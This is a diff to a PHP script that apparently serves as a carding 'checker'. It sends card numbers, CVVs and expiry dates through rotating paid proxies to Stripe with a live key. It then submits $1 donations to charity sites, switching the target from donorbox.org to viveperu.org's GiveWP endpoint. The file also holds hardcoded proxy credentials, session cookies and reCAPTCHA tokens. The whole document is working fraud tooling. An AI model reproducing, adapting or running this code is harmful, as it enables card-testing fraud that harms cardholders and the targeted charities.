@@ -193,7 +193,7 @@ curl_close($ch);
 
 //=======================[Proxys]=============================//
 $rp1 = array(
-  1 => 'hswtuhxo-rotate:g0iaxto4n9bu', /// [ex :- igapfgvg-rotate:4spo27fv5idh]
+  1 => 'iajaothu-rotate:sdk5p0j2bmae', /// [ex :- igapfgvg-rotate:4spo27fv5idh]
     ); 
     $rpt = array_rand($rp1);
     $rotate = $rp1[$rpt];
@@ -256,9 +256,10 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&billing_details[address][postal_code]='.$postcode.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8a222f87-65f7-4425-a54a-b6349c1249bf0c6a7f&muid=b99358ba-6798-497d-96ac-f3386db20a73bdbaa6&sid=5cc7fddf-e653-4c80-8531-8f4e5ac1717652e72d&pasted_fields=number&payment_user_agent=stripe.js%2Fb9e9d8300%3B+stripe-js-v3%2Fb9e9d8300&time_on_page=69212&key=pk_live_1TiySUjG2VvU27ZhnX775lWtq4Gq45tuRo3f47l3fel2t9TuG0hHT2dc9IuyITSCdm8scWA6aQ50qIPoPZ8DZuMns009QRfWOPT');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&billing_details[email]='.$email.'&billing_details[address][line1]='.$street.'&billing_details[address][line2]=&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$postcode.'&billing_details[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=bf4c1bc5-5665-4671-9c99-1284dfee1a38273ec8&sid=8c16d3ee-2705-4542-a3af-12edf6545d47d1a5ee&pasted_fields=number&payment_user_agent=stripe.js%2Fb9e9d8300%3B+stripe-js-v3%2Fb9e9d8300&time_on_page=82698&key=pk_live_SMtnnvlq4TpJelMdklNha8iD&_stripe_account=acct_1031hI2bmikBJrxj');
 
 $result1 = curl_exec($ch);
+$id = trim(strip_tags(getStr($result1,'"id": "','"')));
 //=======================[1 REQ-END]==============================//
 
 
@@ -266,7 +267,7 @@ $result1 = curl_exec($ch);
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://donorbox.org/donation');
+curl_setopt($ch, CURLOPT_URL, 'https://www.viveperu.org/wp-admin/admin-ajax.php');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -277,16 +278,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: donorbox.org',
+'authority: www.viveperu.org',
 'method: POST',
-'path: /donation',
+'path: /wp-admin/admin-ajax.php',
 'scheme: https',
 'accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript',
 'accept-language: en-US,en;q=0.5',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: _donations_session=YpACTHPgtn9l59CogqQQSogY72bdcNClzJLeodbfjI0ZgeST4ygZecpDDh4xZpd3CvoHv9g1x4U0VINjW9E6z8vCKyIjFvDcmwd2hr0A2DOOoczL7Am6wdkGAKAKvUjUunSk4xzvd0Hbv9RNetBk3CsoWe%2F4KQifSuIjbC5HFgnl5lIlpH5DvxOSUaNiryf57ZSBtgu11DoDwVzI7O0pc%2BdGthuNVHOlinRQ9PWhsJM%3D--FHjX9gUtbk3Sp4%2Bt--6mLd%2BKTcAAGshSMJgjAWJA%3D%3D; __cf_bm=lhSoxnun12cShIE4XwfeCmqXstv7PEMfYYaNx7kAVoM-1647117392-0-AWHlaX9YyTJBBl4S0KA6yNn9B8uOPu/CLyO1m+E3oGEkiL2H/ZnQb3AVki/300gBuBgrBPG8UxS7BuecTAScwWLUzMqRcUei7y612gvwC6JBR1Fw6w9tCeOV4te/xeri6g==',
-'origin: https://donorbox.org',
-'referer: https://donorbox.org/embed/sociedad-donations-2',
+'cookie: wp-give_session_5f36e31b0deaee977036bf5193ad2bed=e141e1703f04b9e16a6a250e79afae5e%7C%7C1647197454%7C%7C1647193854%7C%7C77eb84d1ff243a37f2492df27d788d95; wp-give_session_reset_nonce_5f36e31b0deaee977036bf5193ad2bed=1; __stripe_mid=bf4c1bc5-5665-4671-9c99-1284dfee1a38273ec8',
+'origin: https://www.viveperu.org',
+'referer: https://www.viveperu.org/donate-now/?form-id=204834&level-id=custom&custom-amount=1.00&payment-mode=stripe_checkout&form_id=204834',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -296,7 +297,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'utf8=%E2%9C%93&donation%5Bform_id%5D=88606&donation%5Bsms_message_id%5D=&currency=usd&slug=sociedad-donations-2&bf=8f9bb2d51fd3194253705ef56d33c357&sf=asphq2b69ud88606&idempotency_key_index=&new_indian_regulation=false&s=MTY0NzE&t=xNzM5MA&donation_type=stripe&donation%5Butm_params_attributes%5D%5Butm_source%5D=&donation%5Butm_params_attributes%5D%5Butm_medium%5D=&donation%5Butm_params_attributes%5D%5Butm_campaign%5D=&donation%5Butm_params_attributes%5D%5Butm_term%5D=&donation%5Butm_params_attributes%5D%5Butm_content%5D=&fee_amount=0&embedded_form=true&donation%5Bfmv_payment_attributes%5D%5Bamount%5D=0.00&donation%5Bfmv_payment_attributes%5D%5Bdescription%5D=&donation%5Bsuggested_text%5D=&donation%5Bcustom_amount%5D=1&donation%5Bcomment%5D=&donation%5Bfirst_name%5D=jhon&donation%5Blast_name%5D=Mazir&donation%5Banonymous_donation%5D=off&donation%5Bemail%5D=inro125%40tode.com&donation%5Bphone%5D=&donation%5Bcountry%5D=US&donation%5Baddress%5D=145+West+47th+Street&donation%5Bzip_code%5D=10036&donation%5Bcity%5D=New+York&donation%5Bstate%5D=NY&stripe_token=&stripe_pm_id=pm_0Kcbh1TiySUjG2VvsTHLr5Z4&stripe_pi_id=&stripe_public_key=pk_live_1TiySUjG2VvU27ZhnX775lWtq4Gq45tuRo3f47l3fel2t9TuG0hHT2dc9IuyITSCdm8scWA6aQ50qIPoPZ8DZuMns009QRfWOPT&g-recaptcha-response-data%5Bdonation_create%5D=03AGdBq24KxHn_7QTWh69XwzdTXLdyndQ0cug5vPE_hRy37kDw3UFI8-J2PITRfOrfjdFaQMLBX1TQfIeoPOX6LIhNDeKINbOzY_P5RpA8LUI9whJRdkWFCId6YsvyKKggGD4tadeDRZRV9tILuY0jJI6acxKmqnQ2Jcbe7yyxaKpLhWA6Sl2lE5i8Tm3Xg4TZk31iRQs7ePz6bpPl2-XvUZ_HZ8EvT6nTPAwCN2QDfWe_K1uZhz6nK0LI2dbsybPP8WOFKXcgC30i3lf2DSbx-DQya_CMFnR9cVUKrMO8apnLZbP3OFcZW047u6i6AHAes28cstQfjigNI9p_HduA2BY9dNqU6ZlnGHgb55RXq-zKm5L-rxhshVRecnLaxWbdDHPo4eg0N2UKDLMD4g4Ho4dZqR8o1BnK4TKDZd4_QupsWhFSBOjGyUfk0GmvMgJuZKzuqNFkiwQlldyccqc7fpLMPlRJL866iA&g-recaptcha-response=');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'action=give_donation_form_reset_all_nonce&give_form_id=204834');
 
 
 $result2 = curl_exec($ch);
